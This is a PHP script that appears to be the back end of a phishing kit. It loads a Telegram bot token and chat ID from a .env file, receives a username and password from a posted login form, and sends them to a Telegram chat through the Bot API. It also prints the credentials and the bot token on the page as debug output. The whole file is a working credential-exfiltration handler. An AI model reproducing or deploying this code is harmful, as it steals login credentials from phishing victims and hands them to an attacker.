<?php
require __DIR__ . '/../vendor/autoload.php';

echo "📂 Loading environment variables...<br>";

// Manually read and parse .env file
$envPath = __DIR__ . '/../.env';
if (file_exists($envPath)) {
    echo "✅ .env file found!<br>";

    $lines = file($envPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue; // Ignore comments
        list($key, $value) = explode('=', $line, 2);
        putenv("$key=$value");
        $_ENV[$key] = $value;
        $_SERVER[$key] = $value;
    }
} else {
    echo "❌ ERROR: .env file not found!<br>";
}

$botToken = getenv('BOT_TOKEN') ?: 'Not found';
$chatId = getenv('CHAT_ID') ?: 'Not found';

echo "🤖 Bot Token: $botToken<br>";
echo "💬 Chat ID: $chatId<br>";

echo "🔍 Request Method: " . $_SERVER['REQUEST_METHOD'] . "<br>";
print_r($_POST);

// ✅ Corrected request method check
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    echo "📝 Processing POST request...<br>";

    $username = $_POST['username'] ?? 'No username provided';
    $password = $_POST['password'] ?? 'No password provided';

    echo "👤 Username: $username<br>";
    echo "🔑 Password: $password<br>";

    // ✅ Corrected Telegram API parameters
    $data = [
        'chat_id' => $chatId,
        'text' => "Username: $username\nPassword: $password"
    ];

    // ✅ Building URL with query parameters
    $url = "https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query($data);
    echo "🌍 Sending request to: $url<br>";

    // ✅ Sending request
    $result = @file_get_contents($url);

    if ($result === false) {
        echo "❌ ERROR: Failed to send message!<br>";
        $error = error_get_last();
        echo "🛠️ Debug Info: " . $error['message'] . "<br>";
    } else {
        echo "✅ Message sent successfully!<br>";
        echo "📩 Telegram API Response: <pre>$result</pre><br>";
    }
} else {
    echo "❌ Invalid request method! Only POST is allowed.<br>";
}
?>
